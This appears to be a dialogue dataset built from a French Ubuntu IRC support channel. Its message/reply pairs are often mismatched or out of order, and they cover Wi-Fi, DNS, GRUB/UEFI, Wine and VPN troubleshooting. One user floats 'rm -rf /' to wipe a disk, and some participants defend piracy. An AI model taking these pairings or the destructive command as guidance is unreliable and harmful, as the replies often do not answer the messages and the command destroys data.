ValleyView GEN7 (intel) driver = i915	"Si votre carte graphique n'est pas bien détectée, que vous n'avez pas par exemple la 3D, ou que la résolution est très basse, vous pouvez installer une application fournie par Intel, qui va vous installer automatiquement le bon pilote pour votre carte graphique."
McPeter	?
ca existe encore sudo ?	--> []
tout seul ça donne rien.	toutes mes excuses ..;
dur :)	oui, il n'y pas accès au terminal. C'est visiblement un problème de driver au démarrage.
oui, il n'y pas accès au terminal. C'est visiblement un problème de driver au démarrage.	en bootant sur l'ancien noyau tu as déjà vérifié que toutes les mises à jour ont été faites ?
Merci.	tu as essayé de voir si il y avait un accès terminal ? (Ctrl+Alt+F1)
Peut etre un truc dans le bios mais je l'ai pas touché	et le câble, tu en as essayé un autre ?
ça sera surement plus efficace là bas :)	danke schön
merci aussi a beaver d'avoir passé du temps a m'aider bien que je soi con comme un manche a balais ! :)	ok super ! au plaisir
est-ce qu'il y a du monde que ça peut intéresser? Ou je suis pas du tout sur le bon chan pour ça …	il y a #ubuntu-fr-party, tu devrais pouvoir y trouver les parisiens des -party
a l'aise ! merci beaver	ah si, ça doit le faire http://askubuntu.com/questions/514018/how-do-i-get-to-work-my-atheros-ar9485-wireless-card-in-ubuntu-14-04-lts
et eux ils pourront m'aider ou bien ?	ah non désolé ça date un peu c'était pour une 12.04
hum ok ... bah merci alors	http://ubuntuforums.org/showthread.php?t=2181558
enfin j'ai a peu pres digerer ce que tu as dis mais je n'ai aucune idée de comment le faire	bein si la preuve
recomence*	tu lances une connexion au ssid ou pas en // du tailf ?
tu lances une connexion au ssid ou pas en // du tailf ?	je suis un noob :3
ok vu	tu as vue ou faut que je le recommance ?
ma carte wifi est une qualcom artheros j'ai verifié et elle est bien reconnu ..	tu donnes l'url generee
dans l'onglet en haut a droite sur l'icone de connection i'm'dis "le WIFI est desactivé par un commutateur materiel"	et tu n'as pas une touche ou un interrupteur sur ton ordinateur ?
j'ai déjà vu ça quelque part, et l'un des deux résout le problème	je regarde si c'est pas gnome15 qui me fou le bordel
vraiment pénible cette histoire d'accent	regarde du coté des paramètres de langue ou de clavier
y a des gens ou pas ???	oui
oui	j'ai une probleme avec le wifi :/ il veux pas s'activer tu pourais m'aider ?
!paste SergentPoulpy	une fopis fait je fais quoi ?
il était pas mal ce pdf pour les débutants	c'est remplacé par ca depuis longtemps: http://guide.ubuntu-fr.org/ (effort international, pour chaque versions)
Zic ça peut se faire automatiquement?	oui, mais c'est pas forcément conseillé les MàJ auto, à toi de voir
merci	ton Apache est-il accessible de l'extérieur ?
!wiki securite | echo Guest13395	Une erreur est survenue, nW44b n'a pas plus d'informations
beaver oui	ok, tu as pas besoin de firewall sur ton desktop donc
C'est un fournisseur qui fait plein de chose	oui mais sur ta box, as tu un routeur ?
Bon en tout cas merci pour votre coup de main ça marche	sinon par défaut, ton FAI fourni des DNS aussi, à toi de les trouver sur le net si tu veux :)
?	FDN je conseillerai plutôt
Bah je ne sais pas ^^	globalement, chaque fois que tu vas résoudre une adresse DNS en IP, une requête est envoyée à ce serveur
yep ceux de FDN c'est plus mieux	perso j'utilise ceux de mon FAI, Free, et ceux de Google en fallback ou pour tester
ils sont libres d'accès et j'ai confiance en eux :)	quand je n'ai pas le choix, je colle ceux de google, je sais qu'ils loguent les demandes, mais au moins il ne mentent pas en plus
tu peux mettre celui de Google pour tester : 8.8.8.8, mais je te déconseille de le garder en usage quotidien, sauf si ta vie privée n'a pas beaucoup de valeur :)	ils sont pas menteurs ceux d'opendns?
ils sont pas menteurs ceux d'opendns?	je me souviens d'un truc comme ça en effet, zut
Zic une idée?	tu n'as pas configuré les serveurs de résolutions dans network-manager
c'est refusé	tu as quoi dans le fichier : /etc/resolv.conf
209.85.246.129	fait-moi un : host www.google.fr stp
ip 192.168.1.180   maque de reseau 255.255.255.0 passerelle 192.168.1.254	essaie le mtr 8.8.8.8 et dit-moi la dernière ligne affichée :)
mon fichier est bon?	essaie un "mtr 8.8.8.8
oui inet pardon	par contre, l'IP/netmask que tu as choisi n'a pas l'air bon
Oui j'ai un ping sur 192.168.1.254	t'es sûr que tu as utilisé une IP/netmask que ton routeur/box gère pour le static ?
Donc ça marche en local mais j'ai pas internet	check à quoi ressemble ton fichier /etc/network/interfaces
restaurer(*)	no sé, je pense que oui
Zic c'est un keyo	tu peux repérer ça via ton DHCP au pire
Comment ça?	on ne peut savoir à ta place :)
en passerelle je mets quoi?	l'IP de ta passerelle ? :)
je peux modifier par l'interface qui vient de s'afficher?	essaie d'abbord d'ajouter ton user dans le groupe adm et sudo
Oh oui je pense	j'ai qu'une Ubuntu 14.10 sous la main malheureusement, et la GUI a changé depuis :/
oops	a raison Guest13395
Oui /etc/network/interfaces	passe plutôt par la GUI en résumé
Desktop	si Server, ta conf me semble bonne
auto eth0 iface eth0 inet static         address 192.168.10.2         netmask 255.255.255.0         gateway 192.168.10.1	si Desktop, passe plutôt par la GUI de network-manager, tu n'es pas censé touché aux fichiers de conf résal à la mano quand tu utilises network-manager
Comme ceci	édition Desktop ou Server ?
je sais pas	sorry :)
Petite question je n'arrive pas a fixer l'ip d'un pc sous ubunut 12.04 LTS*	ça se fait sur le routeur en lui même
en changeant /usr/share/icons/default/ et en redémmarant, le curseur à changé partout c'est un succès. :)	C'est "cp -d" pour un dossier vide et "cp -r" à l'inverse.
Ya quelqu'un qui donne une astuce, j'aimerais bien l'essayer mais pas d'Acces	aide toi déjà dans un premier temps, si tu veux recevoir de l'aide des autres, faut être concis
Pourquoi je suis en root et j'essaye: cp /home/user/repertoire/ /usr/share/icons/default/    Et ca me dit omission du repertoire d'origine	pourquoi veux-tu faire cel a?
!wiki chown | echo JungleRhythm	Une erreur est survenue, nW44b n'a pas plus d'informations
je check ce que ça dit	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
merci	si tu arrives pas à résoudre ton probleme de ton propre chef, tu pastebin le tout
http://forum.ubuntu-fr.org/viewtopic.php?id=1812311	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Hum Oleti le message était à peu près ça "le système ne gère pas les liens symboliques" mais je vais refaire le truc pour l'avoir plus précisménet	 c'est quand tu etais en fat ça
 c'est quand tu etais en fat ça	ah d'accord, alors je vais passer en EXT 2
C'est à dire que quand j'ai collé mon dossier de sauvegarde, certains fichiers ne se sont pas sauvegardes sur la clé. Si c'était pas du au formate c'était du à quoi ?	 pour ça, il faut un message d'erreur, pas un "ça n'a pas marché"
Je veux ça comme sauvegarde de mon PC, tout simplement. Le problème c'est, je le répète, que j'ai eun problème de "liens symbolique sno ngérés par le système"	 alors ext2
le formatage ext* reserve 5% a root, donc 32 - 5% = a peu pres 28	ah c'est ça alors ! Quel formate me conseilles tu ?
j'utilise l'utiliateur de disque alors, et je reformate en EXT 4 (encore) avec le but de supprimer ce lost + found	 tu sais lire ?
et dans tous les cas, c'est offtopic	justement, t'as des projets comme PT sur Freenode, donc hm..
!ot L4L13N :)	 je sais, c'est toi qui à quoté mon nom plus haut.
 je sais, c'est toi qui à quoté mon nom plus haut.	mais aucun probleme, tu peux me MP si tu veux.. c'est juste que ce qui fait loi sur ce channel, c'est la législation Française
je sais pas c'est ton affirmation hacktus0	effectivement si on revend c'est illégal. En fait techniquement c'est toujours illégal de se procurer gratuitement les œuvres des autres qui sont habituellement payantes. Personnellement, étant un grand consommateur de musique, si j'achetais 100 0e toute la musique que j'écoute, je ne mangerais plus, je ne serais qu'un sans-abris avec une énorme collection de disques. Je ne revend rien, si quelqu'un me demande que
slt tt le monde, comment réduir le pourcentage CPU d'une appli ?	quelle appli ?
Bonjour. Mon imprimante Brother HL-2130 ne fonctionne plus sous Ubuntu. On m'a conseillé de réinstaller la nouvelle version d'Ubuntun mais j'aimerai savoir : comment sauvegarder mes mails Thunderbird, dans mon home ? (je voudrai préserver mes mails, mes marques pages et des fichiers dans le home).	sauvegarde le dossier ~/.thunderbird
sauvegarde le dossier ~/.thunderbird	merci je l'ai trouvé, mais pourquoi devrai le sauvegarde si je réinstalle la nouvelle version, sans écraser la précédent ? je veux dire le home est 100 257d1a0réservé non ?
Apparemment j'ai provoqué ton déclenchement sans bien le vouloir.	j'espère que tu arriveras à faire tourner Starcraft II, au final :p
le « créateur » ce n'est pas un dieu non plus	et on te dit que toute personne a le droit de choisir sous quelle licence libre ou proprietaire il diffuse son oeuvre
et rien ne t'empêche de vendre des copies	c'est au créateur de décider, pas à toi
et affligeant	tu peux utiliser le crowdfunding, le prix libre…
je peux le redimensioner, le retoucher, sans détruire l'original	donc il faut interdire aux artistes numeriques d'etre remunéré ?
c'est pour la même raison que l'expression « biens numériques » est à éviter	et ? un JPG ou un tableau ?
le vol, c'est sous-tirer la propriété, pas en faire une « copie » en quelque sorte	+1
quand tu télécharges illégalement, tu ne t'octroies pas la propriété de l'œuvre	si je vais chier chez toi, je ne suis pas proprio de tes toilettes
le boycott, c'est démodé	et personne ne te force à utiliser ce qui est vendu
c'est à vous de le trouver, pas à moi	non, ce que tu veux c'est ne pas remunérer quelqu'un qui a choisit de faire payer son travail
tout comme le contournement de DRM	si tu donnes la légalité de partager un contenu restreint, tu tues la GPL par la même occasion
ça devrait être légal	et si c'est à cause de leur emploi, leur employeur peut choisir les solutions qui lui plait tant qu'il fournit les moyens techniques
Ils appellent ça "piratage", je préfère utiliser "partage"	partage illégal
il faut se poser la question de l'éthique, toujours	l'éthique ? des développeurs virés parce que le jeu n'a pas réalisé un objectif de ventes suffisant ? :D
ça ne veut pas dire que la copie illégale n'est pas éthique	quelqu'un qui produit un logiciel, il a le choix entre le faire fayer ou le liberer, cependant ca reste son choix, il ne force personne à l'utiliser
vec son voisin ».	qu'est ce que l'ethique vient faire la dedans
mais bon, avant de faire l'apologie du piratage, il faut se rappeler que ce sont les memes lois de copyright/copyleft qui protegent le libre	pour faire du semi-IT (au moins causer Linux sur un canal de distrib GNU/Linux), Linux a grimpé en PDM aux US grâche aux Chromebooks qui se vendent comme des petits pains
mais c'est completement OT	le OT, c'est rien que la faute de Blizzard d'abord (comme toujours)
la reponse est simple: le dema' n'est pas compté dans les chiffres, c'est connu	et je me demande bien pourquoi, sur ton espace privé Steam Workshop, tu as accès aux stats de ventes de ton jeu
comment le PC fait pour representer 14 0es ventes en 2103 en representant 50 0u total en 2013 dès 2011	non mais je valide, je disais juste que les chiffres qu'ils utilisent pour dire "le PC est la 5ème roue du carosse" sont faux
</dérapage_pas_contrôlé>	c'est completement OT, mais bon, si on causait chiffres au lieu de les lancer dans le vent, les stats de Bethesda en 2013: http://www.statisticbrain.com/skyrim-the-elder-scrolls-v-statistics/  à noter: Total Skyrim units sold -> 20,270,000  et vent PC 14% … comment est-ce compatible avec l'article de 2011 suivant:
des ISOs dont le MD5 est connu	le 11 0e skyim, c'est la version pc boite, ils ne comptent pas le demat' dans leur stat
le 11 0e skyim, c'est la version pc boite, ils ne comptent pas le demat' dans leur stat	EA donne les stats consolidées physiques+Origin (beurk) lorsqu'ils parlent des ventes Consoles vs. PC, et en général, ça fait du 22% vs 33% vs. 33%
quoi que Blizzard exporte tout vers les consoles aujourd'hui :)	euh le marché PC jeu est equivalent à la somme des ventes consoles
euh le marché PC jeu est equivalent à la somme des ventes consoles	en équipement peut-être, en ventes de jeux par plateforme, non
1 an après la release Windows, en général, tu as un winetricks qui marche nickel pour ton produit	wine garde un rythme de progression correct, la grande marche a été le support de directX
mais "en train de" c'est relatif nous sommes dimanche lol	bah test avec la dernière version de Wine, en tout cas le jeu est dans les "PLATINIUM supported" de la AppDB de Wine
(crossposting is evil)	Blizzard is evil, surtout :)
Non le script starcraft2 de POL ne marche pas	ça concerne justement le problème d'installation qui ne trouve pas le DVD
Salut :) Je suis en train de suivre ceci: http://www.gamersonlinux.com/forum/threads/starcraft-ii-guide.387/  Bcp de gens disent que ca fonctionne en Wine 1.7.22	tu as essayé ça : sudo mount -o ro,unhide,uid=1000 /dev/cdrom /mnt/cdrom
Ausitot que je clic sur Commencer l'installation dans le logiciel blizzard, j'obtient une erreur qui me dit qu'aucun jeu blizzard n'est trouvé dans mon système... Ce qui est un peu normal puisque c'est ce que je tente de faire.	salut : https://appdb.winehq.org/objectManager.php?sClass=version&iId=20882
=)	bon c'est pas grave, si c'est pour mettre aussi à la corbeille je préfère laisser tel quel plutôt que de faire en sudo et de faire une gaffe juste après
justement pour ses moment ou je n'arrive pas graphiquement à accédé à des fichier	oui mais utiliser sudo pour supprimer ça peut parfois jouer de mauvais tour
spl33n quelle distrib ?	xubuntu 14.10
Bonjour, j'ai un soucis avec mon PC. Je viens d'installer Ubuntu 14.10, et lorsque je veux fermer la session, reboot ou éteindre le PC, l'écran et le clavier reste figé. Que faire ?	un problème avec acpi peut etre ?
que faire?	comment l'as-tu installé ?
!wiki test	Une erreur est survenue et a été logguée. Vérifiez les logs pour plus d'informations.
!wiki multi écran	la documentation est down
!wiki multi ecran	Une erreur est survenue, nW44b n'a pas plus d'informations
Je dois retourner dans le menu grub pour lancer l'efibootmgr ? Car dans une console ça m'affiche "EFI variables are not supported on this system"	il faut charger le module efivars du noyau
moui, enfin je ne vois pas pourquoi il ne commencerait pasplutot par acceder directement à son uefi/bios	parce qu'il ne peut pas, justement
soit elle est disponible sur ton système, soit tu peux l'installer avec "sudo apt-get install efibootmgr"	je disais juste de faire gaffe
je disais juste de faire gaffe	oui, tu as raison :)
plein d'outils adaptés aux UEFI ont un nom en efi* sans le u devant, apparemment	faut veriier la version des spec que ca utilise si tu ne veut pas avoir de surprise … et sur la page de wiki d'ark, l'exemple d'utilisation c'est pour configurer refind, le fork de refit, le bootloader alternatif pour mac
et non, pas necessairement	cette commande est citée dans la page du wiki d'Arch qui parle d'UEFI :)
Oui, c'est pour ça que je le fais pas, trop de risque :O	mais bon, ton vrai probleme, c'est d'acceder au bios/uefi … je ne vois aps de raison de baisser les bras sur le sujet
efi c'est l'ancienne norme créée comme precurseur à uefi que seul apple a implementé en vrai	cela dit, rien n'empêche de l'installer, et la lancer avec -v pour voir ce qu'elle raconte :)
Quoique le rm -rf / n'est pas si bête non ? Si il n'y a plus aucune distrib, le PC va aller automatiquement sur la clé ?	 et si ça boot pas sur la clé, tu fais quoi ?
D'accord, je vais ou après ? J'ai testé un peu chaque option et ça mène pas à grand chose :(	ca depend comment ton uefi ou bios est configuré
Quelqu'un s'y connait en grub	t'as de la chance, à un caractère près t'étais ban un bon bout de temps par le bot
ça semble être une appli qui permet de gérer les entrées de boot en mode UEFI	c'est pas un bootloader pour mac ?
c'est pas un bootloader pour mac ?	ah, c'est un truc pour mac ?
Et dans le recovery mode : http://www.noelshack.com/2015-13-1427549451-2015-03-28-14-22-46.jpg	depuis Ubuntu, regarde si tu peux faire quelque chose avec la commande efibootmgr
Puis dans options avancées : http://www.noelshack.com/2015-13-1427549446-2015-03-28-14-21-49.jpg	c'est le menu de grub, ça :)
y a rien a comprendre a l'uefi, ça remplace le bios, y a plus de menu et d'otions en fonction des constructeurs, comme les bios :)	je ne parle pas de l'interface elle même, mais de la façon dont ça boot
(faudrait vraiment que je comprenne comment ça fonctionne, ces trucs...)	pareil
au pire, virer le disque dur, démarrer pour voir si il a accès au bios	j'y pensais :D
j'ai tenté toutes les variantes (F2, F8, F10, F12), rien y fait : ça me charge directement Ubuntu après la page d'accueil	 et tu ne peux plus booter sur windows ?
Je veut supprimer xubuntu-desktop. Je ne pensse pas que mon dossier personelle soit supprimer. Mais je voulais être sur en vous le demmandent.	aucun paquet ne va supprimer ton dossier personnel
la seule chose à faire, c'est de repondre present quand ils veulent migrer	ton texte o l'air interressant personne ne la traduit depuis le tps ?
ton texte o l'air interressant personne ne la traduit depuis le tps ?	aucune idée
il faut bien attiré les utilisateurs windows pour qu'il vienne utiliser linux, sinon il viendront jamais	bof, pourquoi ? si windows correspond à leurs besoin, pourquoi les forcer? une migration se passe tres bien quand c'est une demarche personnelle, quand c'est forcé, beaucoup moins
pas mal celle la dommage que la 2cv est la plus répandu !	une des meilleures comparaison OS/voitures: http://www.cryptonomicon.com/beginning.html ca date de 1999
il  y a pas un comparatif ubuntu vs Windows 10 ?	en quoi est-ce comparable ? en quoi la comparaison entre une distro linux et une autre version de windows serait differente ? je ne suis pas sûr que la comparaison ait du sens, les différences etant beaucoup trop importantes tant au point techniques que conceptuelles que tout exercice de comparaison perdrait de son utilité
Je veux pouvoir utiliser l'interface graphique pour faire tout et n'importe quoi.	c'est VNC ou NoMachine que tu veux alors, pas ssh -X
c'est VNC ou NoMachine que tu veux alors, pas ssh -X	Ha, d'accord. Je ne savais pas. Merci de l'info. Je cherche de ce coté alors.
merci mezen, mais ce n'est pas bon car j'ai bespoin de charge le script avant la page de login	à ce moment là fais toi un script dans /etc/init.d/
il y arien dans la doc ubuntu-fr	je te propose de faire un fichier .desktop et de le placer dans ~/.config/autostart/
(pourquoi ?)	manque un point
ok donc ubuntu install des fichiers qui ne se sert meme pas ?	dans /usr/share/doc oui
rien :'(	installe et execute "sysv-rc-conf"
Salut, quelqu'un à déjà réeussit à bien configurer 3d windows dans compiz-extras. On dirait que mes fenêtre dépassent et c'est vraiment dégeu comme effet.	J'ai abandonné Compiz quand j'ai vu qu'il n'y avait aucune mise à jour. Je crois que ce n'est plus le cas avec Ubuntu, mais c'est quand même très "buggy" à mon avis. Je préfère utiliser des environnements stables.
que faire?	tu as quoi dans les logs ?
dans ce cas, c'est bien avec free qu'il faut voir :)	les DNS n'ont rien a voir avec ça ?
les DNS n'ont rien a voir avec ça ?	y'a surement des forums et autres brouettes pour ça. Et le trucs, c'est si le vpn te configure un réseau auquel ne sont pas connectées les machines qui t'intéressent, ça moins bien marche
y'a surement des forums et autres brouettes pour ça. Et le trucs, c'est si le vpn te configure un réseau auquel ne sont pas connectées les machines qui t'intéressent, ça moins bien marche	tes réponses user friendly j'espère que tu les dispenses aussi sur les fofo debian en tout cas :)
je vois pas le lien entre le fait d'avoir accès au réseau local, et le fait que le vpn configure aussi les routes	et parenthese, ce que je veux vraiment en fait c'est juste avoir acces au réseau local pour utiliser mon NAS
et parenthese, ce que je veux vraiment en fait c'est juste avoir acces au réseau local pour utiliser mon NAS	le souci, c'est que t'es sur le réseau 192.168.43.0/24 en fait
le souci, c'est que t'es sur le réseau 192.168.43.0/24 en fait	ok ...
ah	il me semblait bien que cela constituait un probleme. Mais avant que je ne les appelles pas parce qu'ils seront incapables de m'aider après de longues minutes d'attente au téléphone, tu peux juste m'expliquer pourquoi ca viens de la freebox et pourquoi ca pose un probleme ?
ah, alors je sais pas. faut voir avec le support de free ?	en fait ce que je venais chercher ici c'était ce genre de remarque, qui me permettent de faire le lien entre ce que je connais et ce que je connais pas. Par exemple, "que le vpn configure aussi les routes" ben faut que j'aille voir mon ami google pour piger
personne n'est un habitué des réseaux VPN ?	t'as consulté https://doc.ubuntu-fr.org/openvpn j'imagine ?
t'as consulté https://doc.ubuntu-fr.org/openvpn j'imagine ?	yep, et je le fais encore. Il est fort possible que la réponse y soit, et que je l'ai raté, comme c'est un nuage de nouvelles informations que je me prends.
yep, et je le fais encore. Il est fort possible que la réponse y soit, et que je l'ai raté, comme c'est un nuage de nouvelles informations que je me prends.	je dirais: 6. Accéder à internet par votre VPN
je dirais: 6. Accéder à internet par votre VPN	si je ne m'abuse ça parle des reglages sur le serveur VPN. Comme c'est sur la freebox c'est limité non ?
si je ne m'abuse ça parle des reglages sur le serveur VPN. Comme c'est sur la freebox c'est limité non ?	je sais pas trop de quoi tu parles avec ton histoire de freebox
je sais pas trop de quoi tu parles avec ton histoire de freebox	bon ça sent la redirection de ports tout ça...
quelqu'un connais bien mpd et pulseaudio ?	sondage tout ça. Pose plutôt la question :)
ok C'est clairement fesable par contre	ben en fait je sais pas si ça dépend uniquement de toi mais aussi du site
Dacc, plutot on peut entre autre fabriquer des programme	tu utilises déjà certains d'entre-eux
Ouai, c'est un editeur de programme.	c'est un peu plus que cela
bonne nuit guy02	cool merci :)
cool merci :)	à vérifier
à vérifier	oui je suis entrain d'éplucher
Ouai je tente actuellement de configurer keepassx( que vous venez de me faire découvrir) . Mais ma question était plutot qu'est-ce-qu'on peut produire avec python. Ca ressemble pas un peu a Visual Basic comme truc?	j'utilise KeePassX avec ma base de données de mdps dans un conteneur chiffré en sync sur 2 machines + 1 serveur, jamais eu de problème !
pour KeePassX oui	je pense que les correctifs semblent avoir été apportés
C'est possible avec python de faire un script qui va ouvrir un portail de tout nos sitepass d'un coup? Du genre tu ouvre le petit programme en question, 1 seul mot de passe et ca ouvre tout tes emails/compte banquaire d'un coup?	http://doc.ubuntu-fr.org/python
c'est pas plutot KeePassX ?	http://changelogs.ubuntu.com/changelogs/pool/main/p/python-urllib3/python-urllib3_1.7.1-1build1/changelog
surtout SurcouF qu'avec un débit de 1,5 Mo j'ai de quoi attendre !!! 1h et demi par distrib ! (quand ça ne plante pas !)	je parlais de tes /home*
parce que avec les versions inférieurs à 2.7.9 il y a des restrictions dans les modules SSL qui limitent la configuration de urllib3. Entre autre ca pose des problèmes de sécurité sur des requêtes HTTPS avec des options de sécurité qui ne peuvent pas être disponibles	les deux existent dans les dépôts mais xul-ext-keefox dépend de keepass2-plugin-rpc, donc...
la version de mon python sur Ubuntu est 2.7.6, comment est-ce que je peux upgrade jusqu'à la 2.7.9 ?	je suis certain que les failles de sécurité sont déjà corrigées
ok	après, il faudra peut-être penser à faire le ménage ;-)
enfin la commande initiale ne comportait pas -c	elle ne fonctionne pas ainsi
guy@serveur:~$ wget -c http://sourceforge.net/projects/handylinux/files/handylinux-1.8-486.iso/download /homebis/tmp	https://viewsby.wordpress.com/2012/12/17/reduce-amount-reserved-free-disk-space-with-tune2fs/
je tape wget l'adresse et la destination...	je veux bien que tu me montres le résultat
bizarre, non SurcouF , il y a des disparités , non ? en additionnant les "utilisé" et "dispo" on est assez loin de la "Taille", non ?	c'est normal
(il est où le champ « idoine » ?) ;-)	à côté du champ de fleurs !
à côté du champ de fleurs !	et donc, comment utilises-tu wget, à présent ?
comment connaitre la version de mon python ?	pourquoi faire ?
exact mais j'ai tout copié	df -kh
je l'envoie sur /homebis sur second disque...	je ne le vois pas sur l'affichage de ton df
ben non	sinon, la méthode X11, c'est sélectionner le texte puis coller directement avec le bouton du milieu
le home de gparted me donne plus de 1 gIO DE LIBRE !	sans doute mais un détail doit t'échapper
résultat variable, c'est ce que j'ai stipulé plus haut vaxire :(, et de surcroit t'as pas un débit extraordinaire	mais comment quitter ?
même via VNC tu aurais pas un résultat exceptionnel, mais ça s'essaye .. ^^	oui, je vais essayer avec un autre type de session
tu vois ta limité n'est pas que matériel, elle est aussi au niveau de ta ligne	comment quitter x2goclient? Quelles touches stp ?
outch	Quand je me connecte un écran noir s'affiche avec la flèche de souris mais pas de bureau, rien d'autre
il y a VNC aussi	sinon est-ce que tu sais comment je peux faire ressortir le lien exact du flux à partir du code source de la page ?
sinon est-ce que tu sais comment je peux faire ressortir le lien exact du flux à partir du code source de la page ?	c'est en Flash donc peu probable :/
Et du coup comme je suis en bout de ligne, ca va peut etre pas le faire, je suis bloqué à de l'adsl. max 360 kbps	livestreamer est très ressource friendly pour lire du stream dans VLC, même en HD
Bon, je vais tenter le coup. Je rejoins le raspberry et tente l'installation etc. Merci et tout à l'heure, je présume.	mais de base une vidéo HD ça consomme des ressources
la qualité de ta ligne a son importance, si tu FEC	ah oui, même pour la version server ?
ah oui, même pour la version server ?	d'apres mon expérience personnelle, oui
apres le résultat est comme j'ai stipulé variable, il n'est pas que matériel, le débit a son importance	qui tourne avec une version de debian dédiée, nommée "Xbian"
c'est surtout côté client que ça va pomper aussi :)	C'est un processeur arm à 700 Mhz avec 500Mo de ram
:)	est-ce que cela demande beaucoup de resources ? Le raspberry tiendrait le cap ?
si t'as des questions à ce sujet vaxire, tu n'hésites pas..	En gros, utiliser le desktop ubuntu depuis le raspberry qui lui ne ferait plus qu'office d'écran en quelques sortes
le résultat final est variable	l'un sur le desktop, l'autre sur le raspberry
!wiki x2go | echo vaxire	Merci. C'est pour alléger les ressources (et donc gagner en rapidité) d'un raspberry pi. Le but est que deux personnes puissent utiliser le desktop ubuntu qui serait donc serveur, mais simultanément.
Salut, peu de rapport avec Ubuntu mais quelqu'un sait comment je peux récupérer le flux vidéo de cette page pour la lire sur VLC ? : http://pluzz.francetv.fr/france5	regarde ici
d'accord	en version serveur LTS, les mises à jour ne doivent pas être très fréquentes n'est ce pas?
je gère mon serveur en root (bien sûr root est bloqué sur ssh, je fais su), et j'aimerais quand même éviter quelques problèmes si on me vole mon mot de passe	sur mes serveurs, la connexion en SSH par mot de passe est désactivée, je me connecte uniquement par clé SSH
merci le problème est réglé ça vire les packets et met à jour le grub comme il faut	un custom semi-root ? non y'en a pas à ma connaissance
parce que j'avais déjà essayé orca sous 12.04  et je n'avais pas trouvé (d'autre part il y a un nombre incroyable d'applis inutiles ; je viens de Debian où il y a aussi un Debian-Mate maintenant mais où je ne vois pas non plus cette fonction )	il y a bien une option Zoom au passage du pointeur, mais ça s'applique pas sur mon bureau, je vois pas pourquoi
et le nom du logiciel c'est "eyes", non ?	j'ai pas réussi à tester les paramètres dans Accès universel, je crois qu'il n'applique que pour gnome-shell
bon vi est bizarre ...	https://doc.ubuntu-fr.org/sudo#les_avantages_de_sudo
moi je vois pas pourquoi tu fais tout en root	qu'est-ce que ça change ?
ubuntu 14.04	une erreur dans le fichier /etc/default/grub
http://pastie.org/10055316	quelle version d'ubuntu?
je regarde dans les forums	tu mens
mais déjà la question première est :"en passant le pointeur est-ce que la loupe se déclenche automatiquement pour psersonne mal voyante" ?	j'installe gnome-orca et je te dirai
merci Marmotte au moins toi tu n'hiberne pas....	moi j'utilise gnome panel car je n'arrive pas à changer mes habitudes et switcher vers les environnements conçus pour les tablettes
:)	avec les ops oui
"don't ask to ask" sur un canal de support, c'est juste fait pour	yep
la politesse, sur IRC, ça sert juste à perdre du temps :D	ah bon! je devrais être beaucoup moins poli alors
pardon, quelqu'un utiliserait Mate ?	pose directement ta question, à quoi ça te servira de savoir qui utilise Mate ?
sondage ?	non pas sondage renseignement sur le son et la fonction loupe....
parce que il semble dans les dépots	https://www.yoctoproject.org/
c'est un truc pour lire les rss ?	non cest une surcouche dOpenEmbeded, je travail sur une demo boar ARM et jaimerai generer le cross copilo/rootfs pour developper une appli par dessus
oui, c'est complexe pour être résolu vite fait là. Et je suis quand même au taf et occupé	je sais Piti, merci pour ton temps
t'as pas ajouté de dépot exotique ?	cette toute petite library me bloque pour installer Yocto, je suis vert
y'a pas de lien	http://paste.ubuntu-fr-secours.org/src-141396
tu peux retenter l'install de libsdl1.2-dev ?	le schema de dependance est impressionnant !
sudo apt-get install unity-control-center	je viens dinstaller cette version et un coup d'apt-get update/;upgrade
ok, c'est étrange ton truc	même pas
!paste	meme résultat dans le premier paste
dpkg -l libcheese-gtk23 libcheese7	javoue que je ne comprend pas le lien entre la lib SDL et ces libs
tu peux essayer d'installer libcheese-gtk23 et libcheese7 ?	unity-control-center is already the newest version.
(ça fait quoi ?)	comme je disais, jutilise Ubuntu 14.04.2 LTS
sudo apt-get install -f	http://paste.ubuntu-fr-secours.org/src-141393
jai un soucis avec la libsdl1.2-dev sur 14.04 http://paste.ubuntu.com/10684034/ quelquun sait comment corriger ce probleme sil vous plait ?	faut sans doute réparer ton gestionaire de paquet avant
faut sans doute réparer ton gestionaire de paquet avant	libcheese-gtk23 is already the newest version libcheese7 is already the newest version
merci pour votre aide	canon, c'est toujours pénible sous linux, ils proposent des drivers proprio: http://www.usa.canon.com/cusa/consumer/products/printers_multifunction/color_laser_multifunction/color_imageclass_mf8280cw#DriversAndSoftware  après si il y a un souci avec il faut contacter le support canon
j'ai pas resseyé dernierement, mais de tete c'est l'option DontZap dans les ServerFlags X	merci je vais allez fouiller la-dedans
Salut a tous, j'ai une petite question, est-ce que quelqu'un sait comment réactiver le redémarrage de X avec les touches ctrl+alt+backspace sous Xubuntu 14.04 ? En fouillant sur le fofo j'ai trouver quelques trucs mais rien qui fait fonctionner cette manip, merci a vous	alt+syst+k
+ le bouquin	C'est juste. Sinon, pour bash, il y a un salon.
Merci, de toute facon je vais rester avec vous, la constance de lire les logs a tout les jour on apprend	sinon, le langage de linux et unix c'est le binaire, langage machine comme pour tout système d'exploitation
dacc. si je commence a parcourir le guide unix je vais me familliariser pas mal?	Oui, c'est bon bouquin. Il suffit d'y piocher de temps en temps, pas de l'apprendre par coeur d'un coup.
:(	bash est un langage qui permet d'interpreter les commandes que l'on soumet au système
un peu comme le langage qui fait tourner DOS dans sa fenetre cmd.exe	Ca y est j'ai récupéré une machine. ;-)
Ca y est j'ai récupéré une machine. ;-)	super, j'espere te voir très souvent alors
Tout a fait, donc si je comprend bien unix et linux c'est les 2 du bash	y'en a sh, bash, csh, zsh, et peut etre d'autres
Le terminal c'est le language unix	Les 2 ont un shell d'installé. Et bash est une amélioration d'un shell plus ancien.
Merci	pas vraiment non
C'est bien le format pdf!	Le langage bash.
C'est Unix	Oui, mais c'est les mêmes commandes.
oubliez j'ai trouvé	sudo lsblk -f
Je n'ai plus d'erreur, et maintenant au demarrage j'ai un beau logo nvidia qui apparait	S'il n'est pas partagé avec Windows, je te conseille de le reformatter en ext4 (après avoir déplacé tes fichiers bien sûr)
Le dernier driver nvidia à été fixé!	Pour le disque externe, c'est NTFS et donc ne comprend pas les permissions de Linux
bonne journée a tous	idem :)
non	sinon tu peux aussi regarder sur le forum pour voir ce que les gens en ont à dire par rapport au modèle de ta carte graphique.
sinon tu peux aussi regarder sur le forum pour voir ce que les gens en ont à dire par rapport au modèle de ta carte graphique.	rypervenche je ne vais pas faire le warrior parce que ca va me retomber dessus je vais rester en libre comme ca j'aurais les modif de la communauté
